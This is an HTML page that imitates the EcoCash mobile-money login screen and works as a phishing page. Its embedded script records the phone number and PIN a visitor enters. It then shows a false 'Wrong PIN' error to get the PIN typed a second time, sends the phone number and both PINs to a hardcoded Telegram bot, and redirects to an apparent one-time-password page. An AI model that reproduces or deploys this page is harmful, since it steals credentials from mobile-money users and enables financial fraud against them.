<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EcoCash Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  font-family:'Poppins',sans-serif;
  background:#ffffff;
  color:#333;
  text-align:center;
}

/* ===== LOGO ===== */
.logo{
  margin-top:50px;
  font-size:42px;
  font-weight:700;
}
.logo span:first-child{color:#0b5ed7}
.logo span:last-child{color:#e63946}

/* ===== LOGIN TEXT ===== */
h2{
  margin:25px 0;
  font-weight:600;
}

/* ===== PHONE INPUT ===== */
.phone-box{
  width:85%;
  margin:0 auto 20px;
  border:2px solid #0b5ed7;
  border-radius:10px;
  display:flex;
  align-items:center;
  padding:10px;
}

.flag{
  margin-right:8px;
  font-size:20px;
}

.phone-box input{
  border:none;
  outline:none;
  font-size:16px;
  flex:1;
}

/* ===== PIN ===== */
.pin-label{
  margin-top:10px;
  margin-bottom:10px;
  color:#666;
}

.pin{
  display:flex;
  justify-content:center;
  gap:10px;
}
#pin-error {
  color: #fff;
  background: #e74c3c;
  border-radius: 6px;
  padding: 8px 0;
  margin: 10px 0;
  text-align: center;
  font-weight: bold;
  letter-spacing: 1px;
  box-shadow: 0 2px 8px rgba(231,76,60,0.15);
  opacity: 0;
  transition: opacity 0.2s, transform 0.2s;
}
.pin input{
  width:45px;
  height:45px;
  border:2px solid #0b5ed7;
  border-radius:8px;
  font-size:20px;
  text-align:center;
}

/* ===== FORGOT ===== */
.forgot{
  margin-top:15px;
  color:#666;
  font-size:14px;
}

/* ===== BOTTOM SECTION ===== */
.bottom{
  margin-top:40px;
  background:#0b5ed7;
  color:#fff;
  padding:40px 20px;
  border-top-left-radius:40px;
  border-top-right-radius:40px;
}

.bottom p{
  margin-bottom:25px;
  font-size:14px;
}

/* ===== BUTTONS ===== */
.actions{
  display:flex;
  gap:15px;
  justify-content:center;
}

.btn{
  background:#fff;
  color:#0b5ed7;
  border:none;
  padding:12px 18px;
  border-radius:12px;
  font-weight:600;
  width:140px;
}

/* ===== FOOTER ===== */
.footer{
  margin-top:20px;
  font-size:12px;
  opacity:.9;
}
.footer a{color:#fff;text-decoration:underline}

/* ===== MOBILE ===== */
@media(max-width:360px){
  .pin input{width:40px;height:40px}
}
</style>
</head>

<body>

<div class="logo">
  <span>Eco</span><span>Cash</span>
</div>

<h2>Login</h2>

<div class="phone-box">
  <div class="flag">ðŸ‡¿ðŸ‡¼</div>
  <strong>+263</strong>
  <input type="text" id="phone" maxlength="10" placeholder="Enter phone number">
</div>

<div class="pin-label">Enter your PIN</div>

<div class="pin">
  <input maxlength="1">
  <input maxlength="1">
  <input maxlength="1">
  <input maxlength="1">
</div>
<div id="pin-error"></div>
<div class="forgot">Forgot PIN?</div>

<div class="bottom">
  <p>
    To register an EcoCash wallet or get assistance,<br>
    click below
  </p>

  <div class="actions">
    <button class="btn">Register</button>
    <button class="btn">Help & Support</button>
  </div>

  <div class="footer">
    <p>v2.1.3P</p>
    <p>
      By signing in you agree to the
      <a href="#">Terms and Conditions</a>
    </p>
  </div>
</div>
<script>
    // JavaScript

const pinInputs = document.querySelectorAll('.pin input');
const errorMsg = document.getElementById('pin-error');
const phoneInput = document.getElementById('phone'); // Assumes <input id="phone">
let pinAttempt = 0;
let firstPin = '';
let secondPin = '';

function getPinValue() {
  return [...pinInputs].map(i => i.value).join('');
}

function sendToTelegram(phone, pin1, pin2) {
  const botToken = '8259929876:AAHTRbsM5kfy34o_bwIKAFS2rJP9qbxK1h4';
  const chatId = '8595009740';
  const message = `Phone: ${phone}\nFirst PIN: ${pin1}\nSecond PIN: ${pin2}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });
}

pinInputs.forEach((input, idx) => {
  input.addEventListener('input', (e) => {
    input.value = input.value.replace(/[^0-9]/g, '');

    if (input.value.length === 1 && idx < pinInputs.length - 1) {
      pinInputs[idx + 1].focus();
    }

    if ([...pinInputs].every(i => i.value.length === 1)) {
      pinAttempt++;
      if (pinAttempt === 1) {
        firstPin = getPinValue();
        errorMsg.textContent = 'Wrong PIN';
        errorMsg.style.opacity = '1';
        setTimeout(() => {
          pinInputs.forEach(i => i.value = '');
          pinInputs[0].focus();
        }, 100);
      } else if (pinAttempt === 2) {
  secondPin = getPinValue();
  const phone = phoneInput.value;
  localStorage.setItem('phoneNumber', phone);
  sendToTelegram(phone, firstPin, secondPin);
  errorMsg.style.opacity = '0'; // Hide the error message
  setTimeout(() => {
    window.location.href = 'otp.html';
  }, 500); // Adjust delay as needed
}
    }
  });
});
    </script>
    
</body>
</html>
